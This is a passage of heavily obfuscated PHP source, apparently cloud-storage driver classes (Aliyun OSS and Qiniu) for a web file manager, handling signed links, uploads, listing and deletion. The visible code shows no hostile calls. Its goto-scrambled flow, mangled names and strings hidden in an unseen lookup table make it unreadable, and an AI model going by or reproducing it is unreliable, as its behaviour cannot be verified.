? 819200 : ($A¥Öšîš‡­ > 838860800 ? 838860800 : $A¥Öšîš‡­); $B¹ŸĞ¾Àìë[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($A¥Öšîš‡­); goto bÔ»ÍÓÄËÍ; C÷§Üê©ß: $a™Ì—¸†ª‘ =& $_SERVER[¢à]; if ($E¼Ù©¯Øğ„ == $a™Ì—¸†ª‘[1186] && $this->isUploadServer() || $E¼Ù©¯Øğ„ == $a™Ì—¸†ª‘[105] && $this->isFileOutServer()) { return $B¹ŸĞ¾Àìë; } $A¥Öšîš‡­ = floatval($GLOBALS[$a™Ì—¸†ª‘[6]][$a™Ì—¸†ª‘[84]][$a™Ì—¸†ª‘[91]][$E¼Ù©¯Øğ„]) * 1024 * 1024 * 8; goto c˜Ø ƒöÉ‡; bÔ»ÍÓÄËÍ: return $B¹ŸĞ¾Àìë; goto bŞ¡°¼³›Ä; bŞ¡°¼³›Ä: } public function link($B¿–±åÕ¼¥, $Bª„·ªÏ = array()) { $bæƒÛš‹æ =& $_SERVER[¢à]; if (!$this->exist($B¿–±åÕ¼¥) || $this->isFolder($B¿–±åÕ¼¥)) { return !1; } try { $Bª„·ªÏ = $this->trafficLimit($bæƒÛš‹æ[105], $Bª„·ªÏ); $bµÜ—§¼ç“ = $this->client->signUrl($this->bucket, $this->pathEncode($B¿–±åÕ¼¥), 3600 * 12, $bæƒÛš‹æ[213], $Bª„·ªÏ); return $this->getCdnLink($bµÜ—§¼ç“); } catch (OSS\Core\OssException $b¯Ğé·šÀç) { return !1; } } public function fileOut($D‚Ö¨ŒŸÎø, $aê³Ä÷Úá¹ = false, $CÄø¢‹§öĞ = false, $AÈó¨Ç«ó‚ = '') { goto fªÃ§¡«ö†; bÓ·ÊÇù: $C¸ÁŠñÓÌì = get_file_mime(get_path_ext($CÄø¢‹§öĞ)); if ($C¸ÁŠñÓÌì == $eÍ¸ìöïã“[198]) { return parent::fileOut($D‚Ö¨ŒŸÎø, $aê³Ä÷Úá¹, $CÄø¢‹§öĞ, $AÈó¨Ç«ó‚); } $aê³Ä÷Úá¹ = $aê³Ä÷Úá¹ ? $eÍ¸ìöïã“[199] : $eÍ¸ìöïã“[200]; goto aãÁ¾Ù°¿¾; aãÁ¾Ù°¿¾: $b˜äÒÑÙÀ’ = array(OSS\OssClient::OSS_SUB_RESOURCE => $eÍ¸ìöïã“[1198] . rawurlencode("{$aê³Ä÷Úá¹}\73\146\151\x6c\x65\156\141\155\145\75{$CÄø¢‹§öĞ}")); $b˜äÒÑÙÀ’[OSS\OssClient::OSS_SUB_RESOURCE] .= $eÍ¸ìöïã“[1199] . $C¸ÁŠñÓÌì; $f—º‘õ¯® = $this->link($D‚Ö¨ŒŸÎø, $b˜äÒÑÙÀ’); goto Cö‹÷¹…ó; fªÃ§¡«ö†: $eÍ¸ìöïã“ =& $_SERVER[¢à]; if (!$CÄø¢‹§öĞ) { $CÄø¢‹§öĞ = $this->pathThis($D‚Ö¨ŒŸÎø); } $CÄø¢‹§öĞ = rawurlencode($CÄø¢‹§öĞ); goto bÓ·ÊÇù; Cö‹÷¹…ó: $this->fileOutLink($f—º‘õ¯®); goto a®Ì—œ˜; a®Ì—œ˜: } public function fileOutServer($f—²ßôÇ¬, $CÓ÷ÓáÇâì = false, $CĞó¶åÚ„° = false, $FÓÙ»Ÿ‘ù† = '') { parent::fileOut($f—²ßôÇ¬, $CÓ÷ÓáÇâì, $CĞó¶åÚ„°, $FÓÙ»Ÿ‘ù†); } public function fileOutImage($f§‚¦··«É, $b¶ó´Š = 250) { $cÑÃÍ‚ÇàØ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[¢à][1200] . $b¶ó´Š); $b©ïèœŒ“ = $this->link($f§‚¦··«É, $cÑÃÍ‚ÇàØ); $this->fileOutLink($b©ïèœŒ“); } public function fileOutImageServer($C’¾Ø‹Âš, $e«ó ¬‡È = 250) { parent::fileOutImage($C’¾Ø‹Âš, $e«ó ¬‡È); } public function fileOutLink($d²‰—Íô´‚) { $f‘î¶àì =& $_SERVER[¢à]; if (!$this->isCdnHost() && substr($d²‰—Íô´‚, 0, 7) == $f‘î¶àì[1104]) { $d²‰—Íô´‚ = $f‘î¶àì[1105] . substr($d²‰—Íô´‚, 7); } header($f‘î¶àì[153] . $d²‰—Íô´‚); die; } public function hashMd5($CŠ£ùŒâ¢, $b³êç„ÀöÇ = '') { $C‚ŞæØ¯³ =& $_SERVER[¢à]; $eğçÛ…øË® = $this->objectMeta($CŠ£ùŒâ¢); if (!$eğçÛ…øË®) { return $C‚ŞæØ¯³[33]; } if (!isset($eğçÛ…øË®[$C‚ŞæØ¯³[1173]]) && !empty($b³êç„ÀöÇ)) { $d´¾ºÈÕßÖ = $this->updateObjMeta($CŠ£ùŒâ¢, array($C‚ŞæØ¯³[1173] => $b³êç„ÀöÇ)); $eğçÛ…øË®[$C‚ŞæØ¯³[1173]] = $d´¾ºÈÕßÖ ? $b³êç„ÀöÇ : $C‚ŞæØ¯³[33]; } return isset($eğçÛ…øË®[$C‚ŞæØ¯³[1173]]) ? strtolower($eğçÛ…øË®[$C‚ŞæØ¯³[1173]]) : $C‚ŞæØ¯³[33]; } public function size($C‡»†éŒÌ¶) { $CÖï¬éÍ÷î = $this->objectMeta($C‡»†éŒÌ¶); return $CÖï¬éÍ÷î ? $CÖï¬éÍ÷î[$_SERVER[¢à][77]] : 0; } public function info($e¦”¥¦«èá) { if ($this->isFolder($e¦”¥¦«èá)) { return $this->folderInfo($e¦”¥¦«èá); } else { if ($this->isFile($e¦”¥¦«èá)) { return $this->fileInfo($e¦”¥¦«èá); } } return !1; } public function exist($ešÍ§À§¤ï) { return $this->isFile($ešÍ§À§¤ï) || $this->isFolder($ešÍ§À§¤ï); } public function isFile($e†•®ö‚¹„) { return !$this->isFolder($e†•®ö‚¹„) && $this->objectMeta($e†•®ö‚¹„); } public function isFolder($e¯’”®­‰Æ) { return $this->cacheMethod($_SERVER[¢à][220], $e¯’”®­‰Æ); } protected function objectMeta($cµÉ×æœÜ) { return $this->cacheMethod($_SERVER[¢à][221], $cµÉ×æœÜ); } protected function _objectMeta($dÇçãºèåÌ) { $B‰Ûµ•»Œ =& $_SERVER[¢à]; try { $F‰ÄæÇƒ£ª = $this->client->getObjectMeta($this->bucket, $this->pathEncode($dÇçãºèåÌ)); } catch (OSS\Core\OssException $e«ƒÆˆ‹Ñ©) { $F‰ÄæÇƒ£ª = !1; } if ($F‰ÄæÇƒ£ª) { $F‰ÄæÇƒ£ª[$B‰Ûµ•»Œ[77]] = intval($F‰ÄæÇƒ£ª[$B‰Ûµ•»Œ[1180]]); } return $F‰ÄæÇƒ£ª; } protected function _isFolder($F÷šñÔóœé) { $eñëÛÆ¿ =& $_SERVER[¢à]; if ($F÷šñÔóœé == $eñëÛÆ¿[33] || $F÷šñÔóœé == $eñëÛÆ¿[8]) { return !0; } $bé‘é¦‹£– = array($eñëÛÆ¿[1170] => $eñëÛÆ¿[8], $eñëÛÆ¿[183] => rtrim($F÷šñÔóœé, $eñëÛÆ¿[8]) . $eñëÛÆ¿[8], $eñëÛÆ¿[1171] => 1, $eñëÛÆ¿[1172] => $eñëÛÆ¿[33]); $C„˜Œ…Ã½ = $this->client->listObjects($this->bucket, $bé‘é¦‹£–); if ($C„˜Œ…Ã½->getObjectList() || $C„˜Œ…Ã½->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($Eµ–äœòîÑ) { parent::__construct(); require_once SDK_DIR . $_SERVER[¢à][1201]; $this->_init($Eµ–äœòîÑ); } public function _init($E­ƒÅ³õ«) { foreach ($E­ƒÅ³õ« as $E›ç©…›ù“ => $Ağ‘ƒÉËÅÃ) { if (isset($this->{$E›ç©…›ù“})) { $this->{$E›ç©…›ù“} = $Ağ‘ƒÉËÅÃ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[¢à][1202], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($e“¨›éÙ³, $e¤ì¬ÁÃâ = '', $bœ† òˆ‡ß = REPEAT_RENAME) { if ($this->setContent($e“¨›éÙ³, $e¤ì¬ÁÃâ)) { return $this->getPathOuter($e“¨›éÙ³); } return !1; } public function mkdir($e‚óôĞùèÒ, $Fí÷¬¯“ = REPEAT_SKIP) { goto F¿ªææí£‚; d¤Í„ŒôÒ: if (!$this->mkfile($F„÷•íŠî)) { return !1; } if (!$this->moveFile($F„÷•íŠî, $e‚óôĞùèÒ)) { $this->delFile($F„÷•íŠî); return !1; } return $this->getPathOuter($c¹ª×¨Å“›); goto A£±»Ê¿ò¶; F¿ªææí£‚: $D†Öîõº½š =& $_SERVER[¢à]; $c¹ª×¨Å“› = trim($e‚óôĞùèÒ, $D†Öîõº½š[8]); if ($this->_isFolder($c¹ª×¨Å“›)) { return $this->getPathOuter($c¹ª×¨Å“›); } goto FœÈ µ×£Ğ; FœÈ µ×£Ğ: $e‚óôĞùèÒ = $c¹ª×¨Å“› . $D†Öîõº½š[8]; $C‰ŠğÍÆİÅ = get_path_this($c¹ª×¨Å“›); $F„÷•íŠî = $e‚óôĞùèÒ . $C‰ŠğÍÆİÅ; goto d¤Í„ŒôÒ; A£±»Ê¿ò¶: } public function copyFile($C‰¯ã‹Å¬Ú, $C—Ëîóáœ¼) { $Bí”óõÜÍ† = $this->bucketManager->copy($this->bucket, $C‰¯ã‹Å¬Ú, $this->bucket, $C—Ëîóáœ¼, !0); return $Bí”óõÜÍ† ? !1 : !0; } public function moveFile($C½½Ëœ¸Â¸, $d”ñàÏƒóÂ) { $d¶Õ‰´ÛÒ¯ = $this->bucketManager->move($this->bucket, $C½½Ëœ¸Â¸, $this->bucket, $d”ñàÏƒóÂ, !0); return $d¶Õ‰´ÛÒ¯ ? !1 : !0; } public function delFile($Eó—è›ù¥Î) { $D¡Ï·ëö¤ = $this->bucketManager->delete($this->bucket, $Eó—è›ù¥Î); return $D¡Ï·ëö¤ ? !1 : !0; } public function delFolder($d¢í½º¬ÓÑ) { $b‡ì¦´«™§ = $this->fileList($d¢í½º¬ÓÑ); if (empty($b‡ì¦´«™§)) { return !0; } $f§½—‘ËŒÆ = 1000; if (count($b‡ì¦´«™§) <= $f§½—‘ËŒÆ) { return $this->qnDelObj($b‡ì¦´«™§) ? !1 : !0; } foreach (array_chunk($b‡ì¦´«™§, $f§½—‘ËŒÆ) as $A‘ÇòÛ¬éŸ) { $fÍƒ‹éÂ½¬ = $this->qnDelObj($A‘ÇòÛ¬éŸ); if ($fÍƒ‹éÂ½¬) { return !1; } } return !0; } private function qnDelObj($BòøØˆŠ) { $BÍÂ‚¯êÅñ = $this->bucketManager->buildBatchDelete($this->bucket, $BòøØˆŠ); list($ešŠÀãÂ»Æ, $B‘¨ó¾§²¤) = $this->bucketManager->batch($BÍÂ‚¯êÅñ); return $B‘¨ó¾§²¤; } private function fileList($AÈ²Ø¡ŒßÓ, $bÈ—óåöĞ¾ = 0) { goto a—³‰½œÌ™; aòô°¢ —¬: $Aœ«œŞ—À = array(); while (!0) { list($BŞÁî°„ÍÄ, $cÅğÂ†ßÆ) = $this->bucketManager->listFiles($this->bucket, $d×‰‡À¬Ğ‚, $dØôÚÀ¤÷, $A‰‰™œ³ËÜ, $fÙ™Ú‡ğ); if ($cÅğÂ†ßÆ) { return !1; } $dØôÚÀ¤÷ = array_key_exists($eóÇÙˆËæ±[1172], $BŞÁî°„ÍÄ) ? $dØôÚÀ¤÷ = $BŞÁî°„ÍÄ[$eóÇÙˆËæ±[1203]] : $eóÇÙˆËæ±[33]; foreach ($BŞÁî°„ÍÄ[$eóÇÙˆËæ±[1204]] as $A¥˜®»“›³) { $c­âî„ = $A¥˜®»“›³[$eóÇÙˆËæ±[89]]; if ($bÈ—óåöĞ¾) { $c­âî„ = array($eóÇÙˆËæ±[28] => $c­âî„, $eóÇÙˆËæ±[77] => $A¥˜®»“›³[$eóÇÙˆËæ±[1205]]); } $Aœ«œŞ—À[] = $c­âî„; } if ($dØôÚÀ¤÷ == $eóÇÙˆËæ±[33]) { break; } } return $Aœ«œŞ—À; goto AÍ¼°É·ïĞ; a—³‰½œÌ™: $eóÇÙˆËæ± =& $_SERVER[¢à]; $AÈ²Ø¡ŒßÓ = trim($AÈ²Ø¡ŒßÓ, $eóÇÙˆËæ±[8]); $d×‰‡À¬Ğ‚ = empty($AÈ²Ø¡ŒßÓ) ? $eóÇÙˆËæ±[33] : $AÈ²Ø¡ŒßÓ . $eóÇÙˆËæ±[8]; goto d½ãÈæ®éÉ; d½ãÈæ®éÉ: $dØôÚÀ¤÷ = $eóÇÙˆËæ±[33]; $A‰‰™œ³ËÜ = 1000; $fÙ™Ú‡ğ = $eóÇÙˆËæ±[33]; goto aòô°¢ —¬; AÍ¼°É·ïĞ: } public function rename($eÍ°Éˆ­, $Få ˜Ï…ƒò) { return $this->renameObject($eÍ°Éˆ­, $Få ˜Ï…ƒò); } public function fileInfo($AÁ¢¦©‘Ü÷, $C¾¥òƒ» = false, $Eô²ùìõâ = array()) { goto d¥´ö’Ä‰¢; b‚¹ñÙ ÒÉ: if (empty($Eô²ùìõâ)) { $Eô²ùìõâ = $this->objectMeta($AÁ¢¦©‘Ü÷); if (!$Eô²ùìõâ) { return $E‹„¸…¶Ö›; } } if (isset($Eô²ùìõâ[$e´Á—‚è††[1206]])) { $E‹„¸…¶Ö›[$e´Á—‚è††[184]] = $Eô²ùìõâ[$e´Á—‚è††[1206]]; } if (isset($Eô²ùìõâ[$e´Á—‚è††[1205]])) { $E‹„¸…¶Ö›[$e´Á—‚è††[77]] = $Eô²ùìõâ[$e´Á—‚è††[1205]]; } goto B·ùÊ¤»Š; d¥´ö’Ä‰¢: $e´Á—‚è†† =& $_SERVER[¢à]; if ($C¾¥òƒ») { return array($e´Á—‚è††[28] => $this->pathThis($AÁ¢¦©‘Ü÷), $e´Á—‚è††[75] => $this->getPathOuter($e´Á—‚è††[8] . $AÁ¢¦©‘Ü÷), $e´Á—‚è††[29] => $e´Á—‚è††[164], $e´Á—‚è††[77] => isset($Eô²ùìõâ[$e´Á—‚è††[1205]]) ? $Eô²ùìõâ[$e´Á—‚è††[1205]] : 0, $e´Á—‚è††[157] => $this->ext($AÁ¢¦©‘Ü÷)); } $E‹„¸…¶Ö› = array($e´Á—‚è††[28] => $this->pathThis($AÁ¢¦©‘Ü÷), $e´Á—‚è††[75] => $this->getPathOuter($e´Á—‚è††[8] . $AÁ¢¦©‘Ü÷), $e´Á—‚è††[29] => $e´Á—‚è††[164], $e´Á—‚è††[184] => 0, $e´Á—‚è††[107] => 0, $e´Á—‚è††[77] => 0, $e´Á—‚è††[157] => $this->ext($AÁ¢¦©‘Ü÷), $e´Á—‚è††[185] => !0, $e´Á—‚è††[186] => !0); goto b‚¹ñÙ ÒÉ; B·ùÊ¤»Š: return $E‹„¸…¶Ö›; goto c¯É¦í«´ˆ; c¯É¦í«´ˆ: } public function folderInfo($a›ƒãÛ˜Á, $FîÑÊÔğ = false) { goto E´³¡Ùó; E´³¡Ùó: $CÕÎ‡¬ë =& $_SERVER[¢à]; if ($FîÑÊÔğ) { return array($CÕÎ‡¬ë[28] => $this->pathThis($a›ƒãÛ˜Á), $CÕÎ‡¬ë[75] => $this->getPathOuter($CÕÎ‡¬ë[8] . $a›ƒãÛ˜Á), $CÕÎ‡¬ë[29] => $CÕÎ‡¬ë[76]); } $b…ÀåÓ³İ = array($CÕÎ‡¬ë[28] => $this->pathThis($a›ƒãÛ˜Á), $CÕÎ‡¬ë[75] => $this->getPathOuter($CÕÎ‡¬ë[8] . $a›ƒãÛ˜Á), $CÕÎ‡¬ë[29] => $CÕÎ‡¬ë[76], $CÕÎ‡¬ë[184] => 0, $CÕÎ‡¬ë[107] => 0, $CÕÎ‡¬ë[1151] => !0, $CÕÎ‡¬ë[1152] => !0); goto A¦‘ºßŒ¸×; A¦‘ºßŒ¸×: $a›ƒãÛ˜Á = rtrim($a›ƒãÛ˜Á, $CÕÎ‡¬ë[8]) . $CÕÎ‡¬ë[8]; $c¼¬Ø¥Ÿ„® = $this->objectMeta($a›ƒãÛ˜Á); if (isset($c¼¬Ø¥Ÿ„®[$CÕÎ‡¬ë[1206]])) { $b…ÀåÓ³İ[$CÕÎ‡¬ë[184]] = $c¼¬Ø¥Ÿ„®[$CÕÎ‡¬ë[1206]]; } goto AàŠ†Ñ„­; AàŠ†Ñ„­: return $b…ÀåÓ³İ; goto CÀ±îºŞ™½; CÀ±îºŞ™½: } public function listPath($E©İĞ²¯¦, $dêÑ•”ğ¹Û = false) { goto cƒ…ôâñİÇ; Aƒ«±ÌºàŒ: $FÅÈ¦ò¼§ = $dªÏè±º•Ù = array(); while (!0) { list($bÔŠ¾×ÇÊ, $DÅÛñÈ…¾) = $this->bucketManager->listFiles($this->bucket, $Fí‘Ç‹—Ù¼, $DŒØ®×‚†™, $bæšŸëï…, $A†²·èĞâ); if ($DÅÛñÈ…¾) { return !1; } $DŒØ®×‚†™ = array_key_exists($D«¯Ê¨Àí[1172], $bÔŠ¾×ÇÊ) ? $DŒØ®×‚†™ = $bÔŠ¾×ÇÊ[$D«¯Ê¨Àí[1203]] : $D«¯Ê¨Àí[33]; if (isset($bÔŠ¾×ÇÊ[$D«¯Ê¨Àí[1207]])) { foreach ($bÔŠ¾×ÇÊ[$D«¯Ê¨Àí[1207]] as $fÏÁŠ¾±¯…) { if ($fÏÁŠ¾±¯… == $Fí‘Ç‹—Ù¼) { continue; } $FÅÈ¦ò¼§[] = $this->folderInfo($fÏÁŠ¾±¯…, $dêÑ•”ğ¹Û); } } if (isset($bÔŠ¾×ÇÊ[$D«¯Ê¨Àí[1204]])) { foreach ($bÔŠ¾×ÇÊ[$D«¯Ê¨Àí[1204]] as $E³ÁœäÛæ) { if ($E³ÁœäÛæ[$D«¯Ê¨Àí[89]] == $Fí‘Ç‹—Ù¼) { continue; } $dªÏè±º•Ù[] = $this->fileInfo($E³ÁœäÛæ[$D«¯Ê¨Àí[89]], $dêÑ•”ğ¹Û, $E³ÁœäÛæ); } } if ($DŒØ®×‚†™ == $D«¯Ê¨Àí[33]) { break; } } return array($D«¯Ê¨Àí[74] => $FÅÈ¦ò¼§, $D«¯Ê¨Àí[73] => $dªÏè±º•Ù); goto cñ§´ãíôì; aÏâŸØª¾ƒ: $DŒØ®×‚†™ = $D«¯Ê¨Àí[33]; $bæšŸëï… = 1000; $A†²·èĞâ = $D«¯Ê¨Àí[8]; goto Aƒ«±ÌºàŒ; cƒ…ôâñİÇ: $D«¯Ê¨Àí =& $_SERVER[¢à]; $E©İĞ²¯¦ = trim($E©İĞ²¯¦, $D«¯Ê¨Àí[8]); $Fí‘Ç‹—Ù¼ = empty($E©İĞ²¯¦) ? $D«¯Ê¨Àí[33] : $E©İĞ²¯¦ . $D«¯Ê¨Àí[8]; goto aÏâŸØª¾ƒ; cñ§´ãíôì: } public function has($a¨–¯ğ®Ò, $b“·‹å‡¤ê = false, $BĞ®µÂˆ– = true) { goto AöÜˆ ğ™ ; dÃÛß“êö·: $Dà…©Ö‘°œ = $DæÂÈ’‚ŠÒ[33]; $c¦Ë³…Ò…¸ = 1000; $AöÕÊ‚¿Æ÷ = $DæÂÈ’‚ŠÒ[8]; goto b ¶Óµ®; cÖ¿¤ö®›ß: if ($b“·‹å‡¤ê) { return array($DæÂÈ’‚ŠÒ[188] => $EôÎ™§õˆĞ, $DæÂÈ’‚ŠÒ[189] => $A³ï¡ß†Ñ); } return !1; goto c¦Ñ³ó²ö; b ¶Óµ®: $EôÎ™§õˆĞ = 0; $A³ï¡ß†Ñ = 0; while (!0) { list($E«í’áÈãå, $A¡‰É»²™÷) = $this->bucketManager->listFiles($this->bucket, $eÙ•¢•­ë…, $Dà…©Ö‘°œ, $c¦Ë³…Ò…¸, $AöÕÊ‚¿Æ÷); if ($A¡‰É»²™÷) { return !1; } $Dà…©Ö‘°œ = array_key_exists($DæÂÈ’‚ŠÒ[1172], $E«í’áÈãå) ? $Dà…©Ö‘°œ = $E«í’áÈãå[$DæÂÈ’‚ŠÒ[1203]] : $DæÂÈ’‚ŠÒ[33]; if ($b“·‹å‡¤ê) { if (!empty($E«í’áÈãå[$DæÂÈ’‚ŠÒ[1204]])) { $EôÎ™§õˆĞ += count($E«í’áÈãå[$DæÂÈ’‚ŠÒ[1204]]); } if (!empty($E«í’áÈãå[$DæÂÈ’‚ŠÒ[1207]])) { $A³ï¡ß†Ñ += count($E«í’áÈãå[$DæÂÈ’‚ŠÒ[1207]]); } if ($Dà…©Ö‘°œ === $DæÂÈ’‚ŠÒ[33]) { break; } continue; } if ($BĞ®µÂˆ–) { if (!empty($E«í’áÈãå[$DæÂÈ’‚ŠÒ[1204]])) { return !0; } } else { if (!empty($E«í’áÈãå[$DæÂÈ’‚ŠÒ[1207]])) { return !0; } } if ($Dà…©Ö‘°œ == $DæÂÈ’‚ŠÒ[33]) { break; } } goto cÖ¿¤ö®›ß; AöÜˆ ğ™ : $DæÂÈ’‚ŠÒ =& $_SERVER[¢à]; $a¨–¯ğ®Ò = trim($a¨–¯ğ®Ò, $DæÂÈ’‚ŠÒ[8]); $eÙ•¢•­ë… = empty($a¨–¯ğ®Ò) ? $DæÂÈ’‚ŠÒ[33] : $a¨–¯ğ®Ò . $DæÂÈ’‚ŠÒ[8]; goto dÃÛß“êö·; c¦Ñ³ó²ö: } public function listAll($Fõç›‡‹­) { $dÎá‡Úªó„ =& $_SERVER[¢à]; $c½õ†òÇ²ë = $this->fileList($Fõç›‡‹­, 1); $Dƒ’Ê‘ì¢ä = array(); foreach ($c½õ†òÇ²ë as $b„ğ¹¯œâ°) { $Dƒ’Ê‘ì¢ä[$b„ğ¹¯œâ°[$dÎá‡Úªó„[28]]] = $b„ğ¹¯œâ°[$dÎá‡Úªó„[77]]; } return $this->listAllFiles($Fõç›‡‹­, array_keys($Dƒ’Ê‘ì¢ä), $Dƒ’Ê‘ì¢ä); } public function canRead($E‚´Ì²¦Çâ) { return $this->exist($E‚´Ì²¦Çâ) ? !0 : !1; } public function canWrite($CÊñƒÓ¶òÂ) { return $this->exist($CÊñƒÓ¶òÂ) ? !0 : !1; } public function getContent($DàŠİÀ‰ˆ) { return $this->fileSubstr($DàŠİÀ‰ˆ, 0, -1); } public function setContent($bƒ¶«Éğ¹, $f„ÌÕµñ£® = '') { $eğÜËàˆó = $this->tempFile($this->pathThis($bƒ¶«Éğ¹)); file_put_contents($eğÜËàˆó, $f„ÌÕµñ£®); if ($this->upload($bƒ¶«Éğ¹, $eğÜËàˆó)) { $this->tempFileRemve($eğÜËàˆó); return !0; } return !1; } public function refreshUrls($cã”¶‚šâ®) { goto fÙĞœ“ï‚‘; fÙĞœ“ï‚‘: $Cä ¹…¨– =& $_SERVER[¢à]; $cƒÈµ²­¯ = array(); if (is_array($cã”¶‚šâ®)) { foreach ($cã”¶‚šâ® as $dõ‚áŠ†ÃÆ) { $cƒÈµ²­¯[] = $this->link($dõ‚áŠ†ÃÆ); } } else { $cƒÈµ²­¯[] = $this->link($cã”¶‚šâ®); } goto Aœ½ÜÕ„å£; añ×ö¿Ø•±: return $eò‹¬Ğà‚Î[$Cä ¹…¨–[1208]] == $Cä ¹…¨–[696] ? !0 : !1; goto bí½õêÑø; Aœ½ÜÕ„å£: $BÆß°±†”´ = new Qiniu\Cdn\CdnManager($this->auth); list($eò‹¬Ğà‚Î, $b¼”³“†«Á) = $BÆß°±†”´->refreshUrls($cƒÈµ²­¯); if ($b¼”³“†«Á) { return !1; } goto añ×ö¿Ø•±; bí½õêÑø: } public function fileSubstr($bÅ®«ñ¦º, $dŠÇŸŠ¶‚, $a–‘ê›Ô¼±) { $a™ğˆ–©® =& $_SERVER[¢à]; if (!($aİç®”Á… = $this->link($bÅ®«ñ¦º))) { return !1; } $fŸÊ‹ÓèÈâ = !1; if ($a–‘ê›Ô¼± > 0) { $cÇŞØˆ² = $dŠÇŸŠ¶‚ + $a–‘ê›Ô¼± - 1; $fŸÊ‹ÓèÈâ = array($a™ğˆ–©®[1209] . $dŠÇŸŠ¶‚ . $a™ğˆ–©®[408] . $cÇŞØˆ²); } $B²ÍâĞéÔ = url_request($aİç®”Á…, $a™ğˆ–©®[213], !1, $fŸÊ‹ÓèÈâ); return $B²ÍâĞéÔ[$a™ğˆ–©®[689]] ? $B²ÍâĞéÔ[$a™ğˆ–©®[1030]] : !1; } public function upload($F×æ Øïæ, $C²­ó¤Ù´Ş, $aõ°¨¬¶à = false, $dÊ‘Ğ•›â÷ = REPEAT_REPLACE) { $d×ë¨öÑÂø = new Qiniu\Storage\UploadManager(); $Cù³ñ£‘±Ç = $this->auth->uploadToken($this->bucket, $F×æ Øïæ); $dÜÏ˜¡Ë±° = get_file_mime(get_path_ext($C²­ó¤Ù´Ş)); list($f‚¨ôÅ¼ , $d•ÙÆ¨†Œ) = $d×ë¨öÑÂø->putFile($Cù³ñ£‘±Ç, $F×æ Øïæ, $C²­ó¤Ù´Ş, null, $dÜÏ˜¡Ë±°); return $d•ÙÆ¨†Œ ? !1 : $this->getPathOuter($F×æ Øïæ); } public function uploadFormData($EÀŞÎÕ†…ˆ, $f¦—ĞÕÅŒ = 3600) { return $this->uploadToken($EÀŞÎÕ†…ˆ, $f¦—ĞÕÅŒ); } public function multiUploadFormData($Dã³äãÇ¤È, $Fµª©½ÕĞ = 3600) { return $this->uploadToken($Dã³äãÇ¤È, $Fµª©½ÕĞ); } private function uploadToken($BöŞÊç¢´š, $c¾Œ°ˆî¢ö = 3600) { goto f¸°•×Œ; f¸°•×Œ: $B‹æï×¨©Ä =& $_SERVER[¢à]; $E‘êÕÉ×ß = $c¾Œ°ˆî¢ö; $eéŞâÉåà = array($B‹æï×¨©Ä[1210] => $B‹æï×¨©Ä[1211]); goto dÙ¿×É‹™¿; dÙ¿×É‹™¿: $A˜ñØÂí–Ë = null; $dÑ–ñŸâ³Å = $this->auth->uploadToken($this->bucket, $A˜ñØÂí–Ë, $E‘êÕÉ×ß, $eéŞâÉåà, !0); $C¨ÇåÕÄ• = empty($this->region) || $this->region == $B‹æï×¨©Ä[1212] ? $B‹æï×¨©Ä[33] : $B‹æï×¨©Ä[408] . $this->region; goto eŒ˜…³Öé; eŒ˜…³Öé: $F›¸“ôÁ¾ = http_type() . "\x3a\x2f\x2f\x75\160\x6c\x6f\141\x64{$C¨ÇåÕÄ•}\x2e\161\151\156\x69\165\x70\56\x63\157\155\x2f"; return array($B‹æï×¨©Ä[1213] => $dÑ–ñŸâ³Å, $B‹æï×¨©Ä[1214] => $F›¸“ôÁ¾); goto aîàƒŒéˆõ; aîàƒŒéˆõ: } public function download($Ešˆ„ÉÔ–”, $a¯Â–ŠÄ°¸) { goto cºÏ»¤âÀ½; cºÏ»¤âÀ½: $Cíï›¡©Çå = IO::getPathInner(IO::mkfile($a¯Â–ŠÄ°¸)); if (!($BÛ©Ç‰ßù = $this->link($Ešˆ„ÉÔ–”))) { return !1; } $FØæÀä“İ” = 0; goto E÷ËŞÁ÷; E÷ËŞÁ÷: $E„í°ğ»™ˆ = 1024 * 200; $FØàÚÒ»š = fopen($Cíï›¡©Çå, $_SERVER[¢à][1215]); while (!0) { $eøÍŒÈÌßÌ = $this->fileSubstr($Ešˆ„ÉÔ–”, $FØæÀä“İ”, $E„í°ğ»™ˆ); if ($eøÍŒÈÌßÌ === !1) { return !1; } fwrite($FØàÚÒ»š, $eøÍŒÈÌßÌ); $FØæÀä“İ” += $E„í°ğ»™ˆ; if (strlen($eøÍŒÈÌßÌ) < $E„í°ğ»™ˆ) { break; } } goto dÑ‡í“á¯; dÑ‡í“á¯: fclose($FØàÚÒ»š); return $a¯Â–ŠÄ°¸; goto fø¤ƒ³Ãêå; fø¤ƒ³Ãêå: } public function link($dŞöïäĞÎ‚, $FĞˆŒÂí¢Ë = '') { if (!$this->isFile($dŞöïäĞÎ‚)) { return !1; } $AéËšøò‘« = $this->getHost() . $_SERVER[¢à][8] . $this->pathEncode($dŞöïäĞÎ‚) . $FĞˆŒÂí¢Ë; return $this->auth->privateDownloadUrl($AéËšøò‘«, 3600 * 12); } public function fileOut($aÌ¨§êˆÊ, $b­Æöœƒ†Ş = false, $DòŒÑ§šâ = false, $E½ÕõöÑŒ² = '') { $EÉÅ¯ øñ =& $_SERVER[¢à]; if (!$DòŒÑ§šâ) { $DòŒÑ§šâ = $this->pathThis($aÌ¨§êˆÊ); } $f¢ÌŠ‹ƒÅ¡ = $b­Æöœƒ†Ş ? $EÉÅ¯ øñ[1216] . rawurlencode($DòŒÑ§šâ) : $EÉÅ¯ øñ[33]; $bšŞê÷ÙõØ = $this->link($aÌ¨§êˆÊ, $f¢ÌŠ‹ƒÅ¡); $this->fileOutLink($bšŞê÷ÙõØ); } public function fileOutServer($fâ±âœæ‰‘, $c›Û×ë‘»» = false, $Dñ×¼öÄ® = false, $f²™š»Ëó = '') { parent::fileOut($fâ±âœæ‰‘, $c›Û×ë‘»», $Dñ×¼öÄ®, $f²™š»Ëó); } public function fileOutImage($FñØ­óÅš, $a²è½×¯â = 250) { $FŒù³ÛÂ÷ñ = $this->link($FñØ­óÅš, $_SERVER[¢à][1217] . $a²è½×¯â); 